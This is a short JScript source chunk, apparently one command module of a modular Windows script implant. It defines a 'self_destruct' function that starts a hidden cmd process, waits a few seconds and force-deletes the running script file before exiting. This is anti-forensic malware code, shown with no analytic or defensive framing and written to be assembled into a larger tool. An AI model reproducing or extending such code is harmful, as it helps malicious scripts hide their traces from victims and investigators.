// chunk: commands/self_destruct
// depends: core/run_cmd
// provides: self_destruct
// format: jscript

function self_destruct() {
    var scriptPath = WScript.ScriptFullName;
    _s.Run("cmd /c ping -n 3 127.0.0.1 >NUL & del /f /q \"" + scriptPath + "\"", 0, false);
    WScript.Quit(0);
}
